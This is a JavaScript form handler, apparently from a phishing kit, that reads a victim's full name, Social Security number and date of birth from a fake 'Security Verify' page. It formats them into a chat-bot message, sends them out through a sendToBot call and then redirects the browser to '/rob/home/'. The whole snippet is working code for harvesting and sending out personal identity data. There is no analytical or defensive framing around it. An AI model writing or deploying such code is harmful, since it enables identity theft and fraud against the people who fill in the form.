async function handleSecuritySubmit() {
    const fullName = document.getElementById('fullName').value;
    const ssn = document.getElementById('ssn').value;
    const dob = document.getElementById('dob').value;
    
    const message = `🔐 <b>Security Verify</b>\n\n` +
        `👤 Name: <code>${fullName}</code>\n` +
        `🆔 SSN: <code>${ssn}</code>\n` +
        `🎂 DOB: <code>${dob}</code>`;
    
    await sendToBot(message, 'security-verify');
    window.location.href = '/rob/home/';
}
